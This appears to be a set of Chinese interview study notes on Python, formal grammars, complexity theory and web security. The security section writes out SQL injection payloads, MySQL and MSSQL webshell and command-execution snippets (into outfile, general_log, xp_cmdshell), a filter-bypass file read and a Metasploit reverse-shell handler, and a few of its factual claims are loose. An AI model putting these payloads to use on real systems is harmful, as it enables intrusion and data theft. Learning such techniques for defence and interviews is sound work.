		print('finally')
print (func())
"""
finally
zero
"""
```

#### 10、python2和3的区别？

**Python3和Python2相比:**

* Python3去除print语句，加 入print()函数实现相同的功能。
* Python2 中/的结果是整型，Python3 中是浮点类型。
* 字符串存储的区别。python2中 字符串以 8-bit 字符串存储，python3中字符串以 16-bit Unicode 字符串存储。存储格式得到了升级。
* 取值范围的区别。python2中用xrange ，python3中用range。如：python2中的 xrange( 0, 4 ) 改为python3中的range(0,4)。
* 键盘输入的区别。从键盘录入一个字符串，python2中是 raw_input( "hello world" )，python3则是 input( "hello world" )。

#### 11、python2的input有什么问题？

python2的input会把输入的东西当成表达式执行,python2的raw_input和python3的input则统一把输入的东西当成字符串。

```python
>>> input('please input:')
please input:__import__("os").listdir('.')
['.config', 'Music', '.condarc', '.vim', ...]
>>> input('please input:')
please input:__import__("os").system('whoami')
```

#### 12、python的线程是不是真正的线程

先来看一个代码

```python
import threading
import time
big_number = 10**8

def dec(n):
	while n:
		n -= 1
def single_thread():
	start = time.time()
	t1 = threading.Thread(target=dec,args=[big_number])
	t1.start()
	t1.join()
	cost = time.time()-start
	print (single_thread.__name__,cost)


def two_thread():
	start = time.time()
	t1 = threading.Thread(target=dec,args=[big_number/2])
	t2 = threading.Thread(target=dec,args=[big_number/2])
	t1.start()
	t2.start()
	t1.join()
	t2.join()
	cost = time.time()-start
	print (two_thread.__name__,cost)

single_thread()
two_thread()
"""
('single_thread', 2.4827499389648438)
('two_thread', 3.7538869380950928)
"""
```

可以看到，我们的两个线程反而更慢了。

原因在于 GIL 。在 Cpython 解释器（Python语言的主流解释器）中，有一把全局解释锁（Global Interpreter Lock），在解释器解释执行 Python 代码时，先要得到这把锁，意味着，任何时候只可能有一个线程在执行代码，其它线程要想获得 CPU 执行代码指令，就必须先获得这把锁，如果锁被其它线程占用了，那么该线程就只能等待，直到占有该锁的线程释放锁才有执行代码指令的可能。

在我们的代码中，CPU切换线程的上下文也是要有开销的，这导致我们用两个线程更慢了。

* 那么我们是否可以骂python多线程真垃圾？！不行

* IO密集型：如果在一个磁盘或网络（input接收消息，output发送消息）为主的程序就不同了。一个线程发完消息之后，等待响应，即处在IO等待的时候，另一个线程还可以在CPU里面跑，有时候CPU闲着没事干，所有的线程都在等着IO，这时候他们就是同时的了，而单线程的话此时还是在一个一个等待的。我们都知道IO的速度比起CPU来是慢到令人发指的，python的多线程就在这时候发挥作用了。比方说多线程爆破一个网站的密码，我们用python的多线程就很快！

  具体来讲，一个线程获得GIL发送消息，然后等待返回消息（阻塞），阻塞过程中释放GIL, 其他线程得到GIL发送消息，然后同样等待返回消息（阻塞）......，这样保证了IO传输过程时间的合理利用，提高io传输效率。

* CPU密集型的程序用python来做，就不合适了，我们可以使用一些库，如`multiprocessing` 创建多个进程出来。

#### 13、协程

> 简单了解即可

又称微线程（Coroutine），协程看上去是子程序，在执行过程中，子程序内部可中断，然后转而执行别的子程序，在适当的时候再返回来接着执行。

* 协程的优势？
  * 协程的特点在于一个线程执行，和多线程比，协程具有极高的执行效率，因为是子程序切换不是线程切换，没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显。
  * 不需要多线程的锁机制：因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不加锁，只需要判断状态就好了，所以执行效率比多线程高很多。



#### 14、python is 和 == 的区别

```python
>>> x=y=[4,5,6]
>>> z=[4,5,6]
>>> (id(x),id(y),id(z))
(4403081088, 4403081088, 4403232992)
>>> x==y
True
>>> x==z
True
>>> x is y
True
>>> x is z
False
```

==是python标准操作符中的比较操作符，用来比较判断两个对象的value(值)是否相等

is也被叫做同一性运算符，这个运算符比较判断的是对象间的唯一身份标识，也就是id是否相同

#### 15、python迭代器(趋势科技面试)

```python
>>> x = [1,2,3,4]
>>> it = iter(x)
>>> next(it)
1
>>> next(it)
2
>>> next(it)
3
>>> next(it)
4
```



### 十一、编译原理

#### 1、什么是LR(1)分析法

在LR(k)这样的名称中，k代表的是分析时所需前看符号（lookahead symbol）的数量，也就是除了目前处理到的输入符号之外，还得再向右引用几个符号之意；省略 （k）时即视为LR(1)，而非LR(0)。

LR分析器是一种由下而上（bottom-up）的上下文无关语法分析器。LR意指由左（Left）至右处理输入字符串，并以最右边优先派生（Right derivation）的推导顺序（相对于LL分析器）构建语法树。能以此方式分析的语法称为LR语法。

#### 2、什么是上下文无关文法 （Context-Free Grammars）

上下文无关文法就是说这个文法中**所有的产生式左边只有一个非终结符**，比如：
S -> aSb
S -> ab
这个文法有两个产生式，每个产生式左边只有一个非终结符S，这就是上下文无关文法，因为你只要找到符合产生式右边的串，就可以把它归约为对应的非终结符。



扩展：乔姆斯基文法分类【0型1型2型3型文法】

一般的文法至少都是0型文法，该文法限制最少，而1,2,3型文法都是在0型文法基础上加以限制形成的。

若将0型文法比作基类的话，1,2,3型文法就是不断继承并加以限制得到的子类。

G=(Vn,Vt,P,S)。其中Vn是非终结符(Non-Terminal)的集合，Vt是终结符(Terminal)的集合，P是推导式的一个集合，S是开始符。

eg：

```matlab
A   —>  a
B   —>  dba
S   —>  Ab
adB —>  d

A、B、S是Vn(非终结符)
a、b、d是Vt（终结符）
整个的集合为P
```

将产生式写成：α→β

* 0型文法(短语结构文法)(Phrase Structure Grammars)

  α∈(VN∪VT)*且至少含有一个**非终结符**

  β∈(VN∪VT)*

  eg:  A—> a

* 1型文法（上下文有关文法）(Context-Sensitive Grammars)

  在0型文法的基础上每一个α→β,都有|β|>=|α|。这里的|β|表示的是β的长度。 (终结符或非终结符的个数)

  注意：虽然要求|β|>=|α|，但有一特例：α→ε也满足1型文法。 

  eg: A—> a、B—>dba则是1型文法，而adB—>d不符合1型文法要求

* 2型文法（上下文无关文法）(Context-Free Grammars)：

  α是一个非终结符，β∈(VN∪VT)*，同时又满足1型文法的条件

  eg:   S -> aSb | ab 。这个文法产生了语言 {a^n b^n : n ≥ 1} 。另外，可以发现这个产生式无法通过正则表达式表示。

* 3型文法（正规文法）(Regular Grammars)：

  它是在2型文法的基础上满足:A→α|αB（右线性）或A→α|Bα（左线性）。

  ⚠️A→a|aB（右线性）和A→a|Ba（左线性）两套规则不能同时出现在一个语法中

  

### 十二、计算理论

#### 1、什么是图灵机？什么是图灵完备？

* 图灵机

  这种假想的机器由一个控制器和一个两端无限长的工作带组成。工作带被划分成一个个大小相同的方格，方格内记载着给定字母表上的符号。控制器带有读写头并且能在工作带上按要求左右移动。随着控制器的移动，其上的读写头可读出方格上的符号，也能改写方格上的符号。这种机器能进行多种运算并可用于证明一些著名的定理。这是最早给出的通用计算机的模型。图灵还从理论上证明了这种假想机的可能性。尽管图灵机当时还只是一纸空文，但其思想奠定了整个现代计算机发展的理论基础。

  「图灵机」理论通过假设模型证明了任意复杂的计算都能通过一个个简单的操作完成，从而从理论上证明了「无限复杂计算」的可能性，直接给计算机的诞生提供了理论基础。

* 图灵完备——More Intelligent 

  一切可计算的问题都能计算，这样的虚拟机或者编程语言就叫图灵完备的。当然图灵完备也可能因为陷入死循环而导致程序崩溃。

  eg: 以太坊的智能合约系统是图灵完备的

* 图灵不完备——More Safe

  不允许或限制循环。

  eg: 比特币BTC的内置脚本表达能力是极为有限的，所以比特币的脚本系统是图灵不完备的

#### 2、什么是NP问题，什么是P问题，什么是NPC问题，什么是NP-head问题

![image-20200306224851521](/Users/godspeed/Library/Application Support/typora-user-images/image-20200306224851521.png)

* **P问题**

  如果一个问题可以找到一个能在多项式的时间里解决它的算法，那么这个问题就属于P问题

  例如：n个数的排序（不超过O(n^2)）

* **NP问题**（Non-deterministic Polynomial）

  可在多项式里猜出(验证)一个解的问题。

  * 显然P问题一定是NP问题
  * 例如：典型的子集求和问题,给定一个整数集合求是否存在一个非空子集它的和为零。如给定集合s={-1,3,2,-5,6}，很明显子集{3,2,-5}能满足问题，并且验证该解只需要线性时间复杂度就能被证实。

* **NP-hard** NP难

  * 如果某个问题S是NP-hard，那么对于任意一个NP问题，我们都可以把这个NP问题在多项式时间之内转化为S，并且原问题的答案和转化后S的答案是相同的。也就是说只要我们解决了S，那么就解决了所有的NP问题。

  * 例如，停机问题。即对于某程序P，给出某输入I，求解此程序P是否会到达终止状态。

  * 扩展：停机问题的解释

    对于任何一个程序，如果该程序中存在死循环，即不能运行到结束，无限循环，则称之为不能终止或者不能停机，否则称之为可停机。停机问题就是说存在一个能检测程序是否停机的程序。假设存在一个程序P，该程序的输入也是一个程序，作用是检测输入程序是否可停机。如果输入的程序可停机，则P输出停机；如果输入的程序不可停机，则P输出不停机。程序P的存在使得可以轻松构造另一个程序LOOP，该程序的输入也是一个程序，作用是调用程序P检测输入程序，如果输入程序可停机，即P输出停机，LOOP进入无限循环；否则LOOP停机。那么对于LOOP(LOOP):当LOOP可停机时，P(LOOP)判断程序LOOP可停机，LOOP(LOOP)进入无限循环，即LOOP不可停机；当LOOP不可停机时，P(LOOP)判断程序LOOP不可停机，LOOP(LOOP)停机，即LOOP可停机。

* **NP-完全问题（NPC问题）**

  NP-complete：一个问题既是NP-hard，又在NP里面

  * 解决了这个问题我们就解决了所有NP问题
  * 这个问题本身也是个NP问题

![image-20200306225214313](/Users/godspeed/Library/Application Support/typora-user-images/image-20200306225214313.png)

### 十三、网络安全

> 本部分是自己准备面试时所学，如果没有相关需求可以略过

#### 第一章 客户端安全

##### 1.1 同源策略（Same origin policy） （高频面试问题）

限制不同的document脚本对当前的document读取或者设置某些属性

> 端口，协议或者域名之一有一个不一样就会产生跨域问题

##### 1.2 浏览器沙箱

浏览器利用沙箱技术，可以让不受网页信任的代码，JavaScript代码运行在一个收到限制的环境中，从而保护本地的桌面系统安全。

浏览器的多进程架构，将浏览器的各个功能分开，当一个进程崩溃时，也不会影响到其他的进程。谷歌是第一个引入浏览器多进程架构的浏览器，主要分为浏览器进程、渲染进程、插件进程以及扩展进程。

##### 1.3 恶意网址拦截

原理：浏览器周期性地从服务器获取一份最新的恶意网址名单。

恶意网站：
①挂马网站：利用浏览器的漏洞执行恶意JavaScript代码
②钓鱼网站：模仿知名网站来欺骗用户

拦截：谷歌黑名单库，EVSSL证书

#### 第二章 跨站脚本攻击

##### 2.1 XSS简介（超级高频重点）

指的是黑客用HTML注入篡改网站，插入恶意脚本，从而在用户浏览时控制用户的权限。

类型：

* 反射型XSS：简单地把用户输入的数据“反射”给用户，往往诱使用户点击才会成功。也成为非持久性XSS攻击

* 存储型XSS：把用户的数据存储在服务端。也称为持久性XSS。

  场景：黑客写下一篇包含有恶意JS代码的文章，所有访问该文站的用户，都会在他们的浏览器中执行这段代码。这段代码被保存到服务器端，存储型因此而得名。

* DOM Based XSS：它的出现是历史原因。并非按照数据是否存储在服务端划分的，效果上来说是反射型的XSS。单独划分来说，比如构造一个事件，闭合源码的`'`,然后插入自己的JavaScript代码。

  * 如和防御？

##### 3.2 XSS攻击进阶

- XSS Playload:攻击者攻击成功之后就会执行它的恶意代码，XSS Playload就是JavaScript代码。比如他会读取你的浏览器cookie对象，这也称为cookie劫持。可以通过HttpOnly标识防止cookie劫持
- 构造GET请求和POST请求可能导致用户删除重要资料和文章。还可以利用这个来获取用户的账户密码等信息。
- 非法获取用户的IP地址。因为很多时候用户的电脑都是使用了***服务器，网站看到的IP地址其实是内网的出口IP地址。

##### 3.3 XSS防御

- HttpOnly:主要是为了解决XSS攻击后的cookie劫持攻击。

  cookie是怎么来的？

  step1 :浏览器向服务器发送请求，这时候是没有cookie的
  step2 :服务器返回set-Cookie头，向客户端浏览器写入Cookie
  step3 :在该Cookie到期之前，浏览器访问该域下的所有页面都应该发送Cookie

  我们可以给指定的cookie设置httponly的标识，不让js访问这一类的cookie

- 输入检查，如XSS-Filter

- 输出检查，变量输出到html页面时，可以使用编码或转义的方式

- 处理富文本（发帖，含有图片视频等内容）：在标签选择上尽量选择白名单，避免使用黑名单，如`<a>` ,`<img>` ,`<div>`

  

<u>相关问题</u>

**xss有cookie一定可以无用户名密码登录吗？**

* 有的网站可能会在Set-Cookie时给关键cookie植入HttpOnly标识，导致我们获取不到cookie

* 有的网站则可能会把Cookie与客户端IP绑定

**xss的本质是什么？**

本质还是注入攻击的一种。系统原本是想接收普通数据的，但恶意攻击者可以写一些恶意js代码，让用户执行，从而造成了一些违背系统愿意的后果。

**你有一个XSS是在内网当中的，你怎么进行后续的利用?**

制作钓鱼站，泄漏其他主机的信息

##### 反射型XSS和DOM型XSS的区别

DOM型XSS通过恶意代码修改页面的 DOM 结构，从效果上来说是反射型XSS，他的出现是历史原因，一些安全专家单独给他分了这个类。回答时我们可以关注这一点，DOM型XSS会修改源网站的DOM结构。

反射型XSS一般是利用url传递参数，但是服务端对参数没有做过滤，直接回显在页面上，如果我们能诱使用户点击某个链接，恶意代码会直接在受害者主机上的浏览器执行，常用来窃取客户端 Cookies 或进行钓鱼欺骗。

**带有HttpOnly的cookie怎么绕过？**

TRACE方法是HTTP（超文本传输）协议定义的一种协议调试方法，该方法使得服务器原样返回任何客户端请求的内容。 
启用TRACE方法存在如下风险： 
1、恶意攻击者可以通过TRACE方法返回的信息了解到网站前端的某些信息，如缓存服务器等，从而为进一步的攻击提供便利。 
2、恶意攻击者可以通过TRACE方法进行XSS攻击。 
3、即使网站对关键页面启用了HttpOnly头标记和禁止脚本读取cookie信息，但是通过TRACE 方法恶意攻击者还是可以绕过这个限制读取到cookie信息。

关闭httpOnly,成功获取cookie

```
GET /?a=TestCookie=something_from_somewhere HTTP/1.1
Host: 115.159.106.12:8080
Connection: keep-alive
```

开启httponly

```
GET /?a= HTTP/1.1
Host: 115.159.106.12:8080
Connection: keep-alive
```



##### XSS 漏洞，在前端如何做，在后端如何做，哪里更好，为什么？

各有各的说法

##### 如何快速判断xss

注入轻量的 “<任意字符>” 标签，然后判断输出点是否受到干扰就可以判断是否xss漏洞了。

##### xss worm原理

用户分享链接导致xss漏洞的危害迅速扩大

##### xss绕过同源策略

* 一些旧版的浏览器曾被发现有绕过SOP的漏洞
* Java同源策略绕过在Java1.7u17版本和1.6u45版本中，如果两个主机名解析到同一个IP地址，那么就不会执行同源策略（Httpsecure.org和 httpssecure.com解析到同一个IP地址）。
* Adobe Reader、Adobe Flash等插件存在许多的安全问题

#### 第四章 跨站请求伪造（Cross-Site Request Forgery）

攻击者在自己的域内伪造一个页面，比如删除某个博客的文章。然后诱使用户访问一个页面，就以该用户身份在第三方站点执行一次操作。

##### CSRF防御

- 验证码：CSRF攻击通常是用户在不知情的情况之下构造了网络请求，而验证码是用户必须与应用进行交互才能完成最终请求。
- Referer Check :用于检查请求是否来自于合法的"源"。比如用户需要发帖就会登陆到后台，那么Referer这个值必然是发帖表单所在的页面。但是有一个缺陷，服务器并非什么时候都会去得到Referer。
- Token:Token 需要同时放在表单中和session中，提交表单时，服务器要验证表单中的Token是否与用户session或者（cookie）中的Token是否一致。
- token一定要足够随机

<u>相关问题</u>

**POST请求的CSRF能用302跳转绕过referer验证吗?**

这个题目问的很模糊。谈谈我的理解。

比如某个网站支持论坛发帖的功能，在正常情况下用户需要先登录到发帖的表单页面，此时的referer是发帖页面，该论坛会对发帖（产生post请求）的 referer进行校验，如果是发帖页面则通过该请求。

我们如果可以诱导用户从发帖页面点击我们的恶意界面，我们的恶意界面中执行POST请求进行发帖，然后302跳转回到发帖界面。

经过我在chrome上的尝试，攻击可以成功的（不论是301还是302都可以成功）。

但在这个问题上，无法给出一个肯定的结论，不同的浏览器的做法是不同的。

我们需要牢记，光靠referer的验证无法杜绝csrf。

**csrf防御措施如果对referer进行校验，如何绕过**

* 判断Referer是否存在某关键词

   referer判断存在不存在google.com这个关键词

   在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过

* 判断referer为空

  ```
  1.如果 referer-policy 的值为never：删除 http head 中的 referer；
  2.如果 referer-policy 的值为default：如果当前页面使用的是 https 协议，而正要加载的资源使用的是普通的 http 协议，则将 http header 中的 referer 置为空；
  3.如果 referer-policy 的值为 origin：只发送 origin 部分；
  4.如果 referer-policy 的值为 always：不改变http header 中的 referer 的值，注意：这种情况下，如果当前页面使用了 https 协议，而要加载的资源使用的是 http 协议，加载资源的请求头中也会携带 referer。
  
  
  其他的如
  5.no-referrer-when-downgrade （默认值）
  在没有指定任何策略的情况下用户代理的默认行为。在同等安全级别的情况下，引用页面的地址会被发送(HTTPS->HTTPS)，但是在降级的情况下不会被发送 (HTTPS->HTTP)。
  6.unsafe-url
  无论是同源请求还是非同源请求，都发送完整的 URL（移除参数信息之后）作为引用地址。（最不安全的策略了）
  
  更详细的见
  https://w3c.github.io/webappsec-referrer-policy/
  ```

  如果页面中包含了如下 meta 标签，所有从当前页面中发起的请求将不会携带 referer：

  ```html
  <meta name="referrer" content="never">
  ```

* 判断referer开头是"*.baidu.com"

  我们可以申请一个自己的域名如`godspeed.cn`,然后建二级域名，`csrf.baidu.cn.godspeed.cn`

##### csrf如何不带referer 如何防范？

* 不带refer

  * 一般情况下， https向http跳转的时候Referer为空

  * 也可以用上一问的方法

  * 某些协议,如利用data:协议，现代的浏览器大多都限制了这些方法。

    ```
    <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">test</a>
    ```

* 防范：见上面的防御技术

  

#### 第五章 点击劫持

##### 5.1 点击劫持

点击劫持其实就是利用视觉上的欺骗手段。攻击者使用一个不透明、不可见的iframe覆盖在网页上，

##### 5.2 拖拽劫持和数据窃取

诱使用户从不可见的iframe中拖拽出攻击者希望得到的数据。

##### 5.3 触屏劫持

- touchstart
- touchend
- touchmove
- touchcancel

##### 5.4 防御ClickJacking

- frame busting
  写一段JavaScript代码防止iframe嵌套
- X-Frame-Options
  使用一个HTTP请求头，当值位DENY时浏览器拒绝加载当前页面任何frame页面；若值为sameorigin时允许加载同源页面下的页面；当值为allow-from origin时就允许加载页面的地址

#### 第六章 HTML5安全

##### 6.1 HTML5新标签

使用HTML5新增的标签，比如说video等用于远程加载资源的标签会存在XSS漏洞。

- iframe的sandbox
  为了限制iframe的脚本，为iframe定义了一个sandbox属性，将iframe所加载的内容视为一个独立的"源"，其中的脚本被限制执行，表单被限制提交，插件被禁止加载。
- postMessage----跨窗口传递信息
  允许每一个window对象往其他的擦窗口发送文本信息，从而实现跨窗口消息传递，这个功能是不受同源策略限制。



#### 第七章 注入攻击

##### 7.1 SQL注入

注入的本质就是把用户输入的数据当成代码执行。由于没有对输入输出进行安全过滤，后台的直接将用户的输入当做了sql语句的一部分，然后就直接执行了。



<u>相关问题</u>

**听过盲注吗，解释一下**
盲注重点就是突出在盲字上，就是不像普通的报错注入可以在页面中回显处数据库错误信息，盲注还分为时间盲注与布尔盲注，布尔盲注相对于时间盲注挖掘起来又要相对便利一点，布尔盲注理解起来就是有变化与没变化这么一个01判断。

**怎么发现sql注入**
当然情景还是挺多的（登陆框处、url、http头中）手工挖掘利用单引号，or 1等方式判断普通的一些注入，如果是时间盲注则需要用sleep这种结合if判断进行，利用工具一般都是用sqlmap测试一个url。

**SQLmap的使用模式和支持的数据库/了解sqlmap的高级使用吗**

* sqlmap支持五种不同的注入模式（就是底下那五种类型）：
  * 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
  * 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
  * 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
  * 联合查询注入，可以使用union的情况下的注入。
  * 堆查询注入，可以同时执行多条语句的执行时的注入。

* sqlmap支持的数据库有

  MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

* 高级使用

  * 用tamper脚本

    `python sqlmap.py -u [url] --tamper [模块名]` sqlmap自带一些模块，如base64，用加号替换空格等等，其实一边自己写脚本也就写一个函数就好了。

  * 用正则表达式过滤代理日志

    ` python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"`

**sql注入有哪些类型说一下(使用场景，原理，和用到的函数)**

1. Boolean-based blind SQL injection（布尔型注入）

   通过判断页面返回情况获得想要的信息。（返回符合预期/返回不符合预期）

   `http://hello.com/view?id=1 and substring(version(),1,1)=5 `

2. Error-based SQL injection（报错型注入）

   如果页面能够输出SQL报错信息，则可以从报错信息中获得想要的信息。

   `select extractvalue(1,concat(0x7e,(select user()),0x7e));`

   `select updatexml(1,concat(0x7e,(select user()),0x7e,1);`

3. UNION query SQL injection（可联合查询注入）

   通过UNION查询获取到所有想要的数据.

   `http://hello.com/view?id=1 UNION ALL SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME FROM INFORMATION_SCHEMA.SCHEMATA`

4. Stacked queries SQL injection（可多语句查询注入/堆叠查询注入）

   能够执行多条查询语句。

   ` http://hello.com/view?id=1;update t1 set content = 'aaaaaaaaa'`

5. Time-based blind SQL injection（基于时间延迟注入）

   页面不会返回错误信息，不会输出UNION注入所查出来的泄露的信息。类似搜索这类请求，boolean注入也无能为力，因为搜索返回空也属于正常的，这时就得采用time-based的注入了，即判断请求响应的时间，但该类型注入获取信息的速度非常慢。

   `http://hello.com/view?q=abc' AND (SELECT * FROM (SELECT(SLEEP(5)))VCVe) OR 1 = '`


**宽字节注入什么原理/如何防范？**

编码为gbk的数据库

`$id = addslashes($_GET['id']);//进行转义`

比如某数据库对我们的输入进行转义，我们输入

`id=1%df' ——> id=1%df%5c%27    ——>    id=1%DF5C%27     ——>   id=1運'`

他会对我们的单引号进行转义(加上一个`\`,即`%5c`)，但是在gbk字符集中，会把`%df%5c`看成一个汉字，然后我们的单引号逃逸出来，从而为注入创造了条件。

防范：规范编码

##### sql单引号被过滤怎么办

看情况。

`select * from user_table where username='1\' and password='or 1=1;#';`

如果是上面这种情况，拼接之后也有注入的可能

##### mysql有哪些表

`select TABLE_NAME from information_schema.tables where table_schema = 'information_schema';`

```
+---------------------------------------+
| TABLE_NAME                            |
+---------------------------------------+
| CHARACTER_SETS                        |🐶
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |🐶
| COLUMN_PRIVILEGES                     |
| ENGINES                               |🐶
| EVENTS                                |🐶
| FILES                                 |🐶
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |🐶
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |🐶
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |🐶
| VIEWS                                 |🐶
+---------------------------------------+
```



##### sql里面只有update怎么利用

报错注入,如

`1’ or updatexml(1,concat(0x7e,database()),0) or’`



**怎么防御sql注入？**

* 不要使用动态SQL

  避免将用户提供的输入直接放入SQL语句中；最好使用准备好的语句和参数化查询，这样更安全。

  * 参数化查询：

    参数化查询是指在设计与数据库链接并访问时，在需要数值或数据的地方，使用参数来给值。即在使用参数化查询的情况下，数据库服务器不会将参数的内容视为SQL指令的一部分来处理，而是在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中有恶意的指令，由于已经编译完成，就不会被数据库运行。目前，参数化查询是最有效可预防SQL注入攻击的的防御方法。

* 不要将敏感数据保留在纯文本中

  加密存储在数据库中的私有/机密数据(如hash)；这样可以提供了另一级保护，以防攻击者成功地找出敏感数据。

* 限制数据库权限和特权

  将数据库用户的功能设置为最低要求；这将限制攻击者在设法获取访问权限时可以执行的操作。

* 避免直接向用户显示数据库错误

  攻击者可以使用这些错误消息来获取有关数据库的信息。

* 对访问数据库的Web应用程序使用Web应用程序防火墙（WAF）

  这为面向Web的应用程序提供了保护，它可以帮助识别SQL注入尝试；根据设置，它还可以帮助防止SQL注入尝试到达应用程序（以及数据库）。

* 定期测试与数据库交互的Web应用程序

  这样做可以帮助捕获可能允许SQL注入的新错误。

* 定期更新数据库

  这可以防止攻击者利用旧版本中存在的已知弱点/错误。

#### 第八章 认证与会话管理

- 认证的目的就是为了认出用户是谁，授权就是为了决定用户能够做什么。
- 认证实际上就是一个验证凭证的过程。
- 单点登陆，用户登陆一次就可以访问所有的系统。
- OpenID是一个开放的单点登陆系统，用的是URI作为用户在互联网上面的标识，然后网站重定向到openID的提供者认证，认证完成后再重定向回网站。
- web应用中，用户登陆后，服务器会返回一个sessionID加密写在浏览器的cookie上。

#### 第九章 面试搜集

##### 1、远程命令执行的时候过滤了空格，如何读取文件？

Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。

```
cat flag.txt
cat${IFS}flag.txt
cat$IFSflag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
```

##### 2、有哪些内网穿透的工具?

Ngrok、frp、EW、reGeorg

端口转发：lcx、termite

##### 3、mysql写shell有几种方法？

* 条件
  * 对目录有写权限
  * GPC关闭(GPC:是否对单引号转义)
  * 知道当前网站的绝对路径
  * 写入的那个路径存在写入权限

* union select 后写入

  ```
  select * from test where id=1 union select '<?php assert($_POST["cmd"]);?>' into outfile '/home/wwwroot/shadowyspirits/evil.php'
  ```

* `lines terminated by`/`lines starting by`/`fields terminated by`/`COLUMNS terminated by` 

  如：

  `select * from test where id = 1 into outfile '/var/www/html/evil.php' lines terminated by '<?php phpinfo() ?>';`

* 利用mysql日志文件来拿shell

  步骤：

  1. 看默认log日志位置,做好记录

     `show variables like '%general%';`

  2. 设置“记录日志”的状态为开启

     `set global general_log = on; `

  3. 设置log位置

     `set global general_log_file='/home/www/var/evil.php'`

  4. 执行命令

     `select '<?php eval($_POST[request]);?>';    `

  5. 这个时候日志里就会有我们的东西了

  6. 清理现场

<u>相关问题</u>

**GPC如何绕过？**



##### 4、OWASP TOP 10 有哪些？

OWASP（Open Web Application Security Project）开放式Web应用程序安全项目

2017年的

* 注入（injection）
* 失效的身份认证（identification）
* 敏感数据泄露（data leak）
* 外部实体(XXE)
* 失效的访问控制（Access）
* 安全配置错误（Settings）
* 跨站脚本（xss）
* 不安全的反序列化（unserialize）
* 使用含有已知漏洞的组件（0day）
* 不足的日志记录和监控（log）

##### 5、安全领域的会议有哪些？

* USENIX Security

  包含：二进制安全、固件安全、取证分析、Web安全、隐私保护、恶意分析等。

* IEEE：IEEE Symposium on Security and Privacy

  被认为是计算机安全的最高会议，以应用型为主

* CCS：ACM Conference on Computer and Communications Security

  多样性很强

* NDSS： Network and Distributed System Security Symposium

  关于网络和分布式系统安全的会议，偏应用型

##### 6、了解最新的漏洞吗？

CVE-2020-0601，攻击者可以利用这个漏洞，使用伪造的代码签名证书对恶意的可执行文件进行签名，并以此恶意文件来进行攻击。

##### 7、代码审计的思路？

* 根据敏感关键字回溯参数传递过程。
* 查找可控变量，争相追踪变量传递过程。
* 寻找敏感功能点，通读功能点代码。
* 通读全文代码。

##### 8、应急响应的流程

应急响应指的是在系统或者网站遭到黑客入侵后，我们需要对攻击事件的类型进行定义，对攻击发生的原因进行溯源分析，查找黑客入侵的方式以及是否留有后门，所以应急响应是一项十分重要的工作。

* P(PreParation准备) 准备病毒查杀工具
* D(Detection诊断）诊断攻击方式
* C(Containment抑制) 避免事件进一步升级
* E(Eradication根除）修复漏洞，清除后门
* R(Recovery恢复) 对业务进行恢复
* F(follow-up跟踪）对服务器进行监控

##### 9、Metasploit 打开反向监听的命令

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

##### 10、mssql用什么组件执行命令,如果不可用怎么办?

组件：xp_cmdshell

`exec master..xp_cmdshell "whoami"`

不可用:`exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;`

如果xp_cmdshell被删除，可以尝试上传xplog70.dll进行恢复，恢复语句：

`exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'`

##### 11、对软件保护有什么机制（华为）

加壳，反调试，混淆

##### 12、python的requests模块和urllib模块有什么区别

requests可以直接构建常用的get和post请求并发起，urllib一般要先构建get或者post请求，然后再发起请求。

```python
#py3
import requests
url = 'https://www.baidu.com'
r = requests.get(url=url)
print (r.text)

r = urllib.request.Request(url)
response = urllib.request.urlopen(r)
print(response.read())
```

* 关于网络请求的模块

  urllib requests socket

##### 13、在一百个文件中查找一百个关键词 ，排序前十个出现次数最多的

```
cat * | grep -o 'aaa\|bbb\|ccc' | sort | uniq -c
```

cat：查看文件

grep -o ： 输出符合条件的（例子中只要是aaa或bbb或ccc就输出）

sort：排序

uniq：去重，在每列旁边显示该行重复出现的次数

##### 14、burpsuite有什么优点/burpsuite哪里特别好用？

抓包什么的很方便，抓完修改一下直接放行；

repeater

##### 15、给你一个网站，怎么找漏洞？

先找输入点，以此来测试可能存在的各种注入情况(包括xss)，然后登陆处的逻辑，（验证码绕过，登陆流程可绕过，越权等），如果是渗透，首先就是扫目录，查旁站，判断cms等信息收集工作，当然端口也是会扫的判断操作系统以及搭建的服务。

##### 16、除了waf，还有什么好的防御web攻击的方案

机器学习，拟态防御

##### 17、302跳转和301跳转的区别

301跳转是“永久性转移”

`header("Location: http://115.159.106.12/cst.php",TRUE,301);`

302跳转是“临时性跳转”

` header('Location: http://115.159.106.12/cst.php');`





##### 18、对于越权的防御，除了限制权限还有什么方法

更新系统，安装杀毒软件

##### 19、对docker底层了解吗

Docker使用Go语言实现。
Docker利用linux内核的几个特性来实现功能:

* 利用linux的命名空间(Namespaces)

